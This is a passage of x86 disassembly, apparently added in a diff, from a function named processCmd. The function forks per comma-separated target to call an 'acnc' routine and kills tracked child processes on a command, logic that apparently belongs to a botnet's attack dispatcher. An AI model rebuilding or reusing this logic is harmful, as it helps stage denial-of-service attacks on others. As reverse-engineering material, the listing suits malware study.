+ 804dfe9: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dfec: 83 c0 0c                     	addl	$0xc, %eax
+ 804dfef: 8b 00                        	movl	(%eax), %eax
+ 804dff1: 89 04 24                     	movl	%eax, (%esp)
+ 804dff4: e8 e3 53 00 00               	calll	0x80533dc <atol>
+ 804dff9: 89 45 e0                     	movl	%eax, -0x20(%ebp)
+ 804dffc: 8b 45 d8                     	movl	-0x28(%ebp), %eax
+ 804dfff: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804e007: 89 04 24                     	movl	%eax, (%esp)
+ 804e00a: e8 51 35 00 00               	calll	0x8051560 <strchr>
+ 804e00f: 85 c0                        	testl	%eax, %eax
+ 804e011: 74 72                        	je	0x804e085 <processCmd+0x2297>
+ 804e013: 8b 45 d8                     	movl	-0x28(%ebp), %eax
+ 804e016: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804e01e: 89 04 24                     	movl	%eax, (%esp)
+ 804e021: e8 8e 37 00 00               	calll	0x80517b4 <strtok>
+ 804e026: 89 45 e4                     	movl	%eax, -0x1c(%ebp)
+ 804e029: eb 52                        	jmp	0x804e07d <processCmd+0x228f>
+ 804e02b: e8 25 b7 ff ff               	calll	0x8049755 <listFork>
+ 804e030: 85 c0                        	testl	%eax, %eax
+ 804e032: 75 32                        	jne	0x804e066 <processCmd+0x2278>
+ 804e034: 8b 45 e0                     	movl	-0x20(%ebp), %eax
+ 804e037: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804e03b: 8b 45 dc                     	movl	-0x24(%ebp), %eax
+ 804e03e: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804e042: 8b 45 e4                     	movl	-0x1c(%ebp), %eax
+ 804e045: 89 04 24                     	movl	%eax, (%esp)
+ 804e048: e8 21 d7 ff ff               	calll	0x804b76e <acnc>
+ 804e04d: a1 c0 b3 05 08               	movl	0x805b3c0, %eax
+ 804e052: 89 04 24                     	movl	%eax, (%esp)
+ 804e055: e8 ba 21 00 00               	calll	0x8050214 <close>
+ 804e05a: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804e061: e8 52 21 00 00               	calll	0x80501b8 <_exit>
+ 804e066: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804e06e: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804e075: e8 3a 37 00 00               	calll	0x80517b4 <strtok>
+ 804e07a: 89 45 e4                     	movl	%eax, -0x1c(%ebp)
+ 804e07d: 83 7d e4 00                  	cmpl	$0x0, -0x1c(%ebp)
+ 804e081: 75 a8                        	jne	0x804e02b <processCmd+0x223d>
+ 804e083: eb 32                        	jmp	0x804e0b7 <processCmd+0x22c9>
+ 804e085: e8 cb b6 ff ff               	calll	0x8049755 <listFork>
+ 804e08a: 85 c0                        	testl	%eax, %eax
+ 804e08c: 0f 85 36 01 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804e092: 8b 45 e0                     	movl	-0x20(%ebp), %eax
+ 804e095: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804e099: 8b 45 dc                     	movl	-0x24(%ebp), %eax
+ 804e09c: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804e0a0: 8b 45 d8                     	movl	-0x28(%ebp), %eax
+ 804e0a3: 89 04 24                     	movl	%eax, (%esp)
+ 804e0a6: e8 c3 d6 ff ff               	calll	0x804b76e <acnc>
+ 804e0ab: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804e0b2: e8 01 21 00 00               	calll	0x80501b8 <_exit>
+ 804e0b7: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804e0ba: 8b 00                        	movl	(%eax), %eax
+ 804e0bc: 89 85 1c fd ff ff            	movl	%eax, -0x2e4(%ebp)
+ 804e0c2: c7 85 18 fd ff ff 47 8e 05 08	movl	$0x8058e47, -0x2e8(%ebp) # imm = 0x8058E47
+ 804e0cc: c7 85 14 fd ff ff 06 00 00 00	movl	$0x6, -0x2ec(%ebp)
+ 804e0d6: fc                           	cld
+ 804e0d7: 8b b5 1c fd ff ff            	movl	-0x2e4(%ebp), %esi
+ 804e0dd: 8b bd 18 fd ff ff            	movl	-0x2e8(%ebp), %edi
+ 804e0e3: 8b 8d 14 fd ff ff            	movl	-0x2ec(%ebp), %ecx
+ 804e0e9: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804e0eb: 0f 97 c2                     	seta	%dl
+ 804e0ee: 0f 92 c0                     	setb	%al
+ 804e0f1: 88 d1                        	movb	%dl, %cl
+ 804e0f3: 28 c1                        	subb	%al, %cl
+ 804e0f5: 88 c8                        	movb	%cl, %al
+ 804e0f7: 0f be c0                     	movsbl	%al, %eax
+ 804e0fa: 85 c0                        	testl	%eax, %eax
+ 804e0fc: 0f 85 c6 00 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804e102: c7 45 e8 00 00 00 00         	movl	$0x0, -0x18(%ebp)
+ 804e109: c7 45 ec 00 00 00 00         	movl	$0x0, -0x14(%ebp)
+ 804e110: eb 59                        	jmp	0x804e16b <processCmd+0x237d>
+ 804e112: 8b 45 ec                     	movl	-0x14(%ebp), %eax
+ 804e115: c1 e0 02                     	shll	$0x2, %eax
+ 804e118: 89 c2                        	movl	%eax, %edx
+ 804e11a: a1 58 16 06 08               	movl	0x8061658, %eax
+ 804e11f: 8d 04 02                     	leal	(%edx,%eax), %eax
+ 804e122: 8b 00                        	movl	(%eax), %eax
+ 804e124: 85 c0                        	testl	%eax, %eax
+ 804e126: 74 40                        	je	0x804e168 <processCmd+0x237a>
+ 804e128: 8b 45 ec                     	movl	-0x14(%ebp), %eax
+ 804e12b: c1 e0 02                     	shll	$0x2, %eax
+ 804e12e: 89 c2                        	movl	%eax, %edx
+ 804e130: a1 58 16 06 08               	movl	0x8061658, %eax
+ 804e135: 8d 04 02                     	leal	(%edx,%eax), %eax
+ 804e138: 8b 18                        	movl	(%eax), %ebx
+ 804e13a: e8 b1 21 00 00               	calll	0x80502f0 <getpid>
+ 804e13f: 39 c3                        	cmpl	%eax, %ebx
+ 804e141: 74 25                        	je	0x804e168 <processCmd+0x237a>
+ 804e143: 8b 45 ec                     	movl	-0x14(%ebp), %eax
+ 804e146: c1 e0 02                     	shll	$0x2, %eax
+ 804e149: 89 c2                        	movl	%eax, %edx
+ 804e14b: a1 58 16 06 08               	movl	0x8061658, %eax
+ 804e150: 8d 04 02                     	leal	(%edx,%eax), %eax
+ 804e153: 8b 00                        	movl	(%eax), %eax
+ 804e155: c7 44 24 04 09 00 00 00      	movl	$0x9, 0x4(%esp)
+ 804e15d: 89 04 24                     	movl	%eax, (%esp)
+ 804e160: e8 4f 22 00 00               	calll	0x80503b4 <kill>
+ 804e165: ff 45 e8                     	incl	-0x18(%ebp)
+ 804e168: ff 45 ec                     	incl	-0x14(%ebp)
+ 804e16b: 8b 75 ec                     	movl	-0x14(%ebp), %esi
+ 804e16e: bf 00 00 00 00               	movl	$0x0, %edi
+ 804e173: 89 b5 20 fe ff ff            	movl	%esi, -0x1e0(%ebp)
+ 804e179: 89 bd 24 fe ff ff            	movl	%edi, -0x1dc(%ebp)
+ 804e17f: a1 c8 b3 05 08               	movl	0x805b3c8, %eax
+ 804e184: 8b 15 cc b3 05 08            	movl	0x805b3cc, %edx
+ 804e18a: 89 85 28 fe ff ff            	movl	%eax, -0x1d8(%ebp)
+ 804e190: 89 95 2c fe ff ff            	movl	%edx, -0x1d4(%ebp)
+ 804e196: 8b 95 2c fe ff ff            	movl	-0x1d4(%ebp), %edx
+ 804e19c: 39 95 24 fe ff ff            	cmpl	%edx, -0x1dc(%ebp)
+ 804e1a2: 0f 82 6a ff ff ff            	jb	0x804e112 <processCmd+0x2324>
+ 804e1a8: 8b 8d 2c fe ff ff            	movl	-0x1d4(%ebp), %ecx
+ 804e1ae: 39 8d 24 fe ff ff            	cmpl	%ecx, -0x1dc(%ebp)
+ 804e1b4: 77 12                        	ja	0x804e1c8 <processCmd+0x23da>
+ 804e1b6: 8b b5 28 fe ff ff            	movl	-0x1d8(%ebp), %esi
+ 804e1bc: 39 b5 20 fe ff ff            	cmpl	%esi, -0x1e0(%ebp)
+ 804e1c2: 0f 82 4a ff ff ff            	jb	0x804e112 <processCmd+0x2324>
+ 804e1c8: 81 c4 0c 03 00 00            	addl	$0x30c, %esp            # imm = 0x30C
+ 804e1ce: 5b                           	popl	%ebx
+ 804e1cf: 5e                           	popl	%esi
+ 804e1d0: 5f                           	popl	%edi
+ 804e1d1: 5d                           	popl	%ebp
+ 804e1d2: c3                           	retl
